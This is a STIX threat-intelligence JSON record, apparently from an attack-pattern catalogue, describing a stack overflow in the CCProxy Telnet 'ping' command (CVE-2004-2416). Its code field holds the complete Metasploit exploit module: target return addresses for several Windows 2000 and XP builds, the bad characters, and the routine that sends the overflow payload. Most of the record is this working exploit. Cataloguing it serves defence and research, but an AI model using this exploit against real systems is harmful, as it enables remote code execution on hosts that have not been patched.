{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8ba0e75f-c2cb-45a4-a8ba-69fcbc3b1efb",
    "created": "2024-08-14T16:56:41.773026Z",
    "modified": "2024-08-14T16:56:41.773031Z",
    "name": "CCProxy Telnet Proxy Ping Overflow",
    "description": " This module exploits the YoungZSoft CCProxy <= v6.2 suite Telnet service. The stack is overwritten when sending an overly long address to the 'ping' command. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/proxy/ccproxy_telnet_ping.rb",
            "external_id": "ccproxy_telnet_ping.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-2416"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'CCProxy Telnet Proxy Ping Overflow',\n      'Description'\t=> %q{\n          This module exploits the YoungZSoft CCProxy <= v6.2 suite\n        Telnet service. The stack is overwritten when sending an overly\n        long address to the 'ping' command.\n      },\n      'Author' \t=> [ 'aushack' ],\n      'Arch'\t\t=> [ ARCH_X86 ],\n      'License'       => MSF_LICENSE,\n      'References'    =>\n        [\n          [ 'CVE', '2004-2416' ],\n          [ 'OSVDB', '11593' ],\n          [ 'BID', '11666' ],\n          [ 'EDB', '621' ],\n        ],\n      'Privileged'\t\t=> false,\n      'DefaultOptions'\t=>\n        {\n          'EXITFUNC' \t=> 'thread',\n        },\n      'Payload' =>\n        {\n          'Space'\t\t=> 1012,\n          'BadChars' \t=> \"\\x00\\x07\\x08\\x0a\\x0d\\x20\",\n        },\n      'Platform' => ['win'],\n      'Targets' =>\n        [\n          # Patrick - Tested OK 2007/08/19. W2K SP0, W2KSP4, XP SP0, XP SP2 EN.\n          [ 'Windows 2000 Pro All - English', { 'Ret' => 0x75023411 } ], # call esi ws2help.dll\n          [ 'Windows 2000 Pro All - Italian', { 'Ret' => 0x74fd2b81 } ], # call esi ws2help.dll\n          [ 'Windows 2000 Pro All - French',  { 'Ret' => 0x74fa2b22 } ], # call esi ws2help.dll\n          [ 'Windows XP SP0/1 - English',     { 'Ret' => 0x71aa1a97 } ], # call esi ws2help.dll\n          [ 'Windows XP SP2 - English',\t    { 'Ret' => 0x71aa1b22 } ], # call esi ws2help.dll\n        ],\n      'DisclosureDate' => '2004-11-11'))\n\n    register_options(\n      [\n        Opt::RPORT(23),\n      ])\n  end\n\n  def check\n    connect\n    banner = sock.get_once || ''\n    disconnect\n\n    if banner.to_s =~ /CCProxy Telnet Service Ready/\n      return Exploit::CheckCode::Detected\n    end\n      return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    sploit  = \"p \" + payload.encoded + [target['Ret']].pack('V') + make_nops(7)\n    sock.put(sploit + \"\\r\\n\")\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-11-11",
    "x_mitre_platforms": [
        "['win']"
    ]
}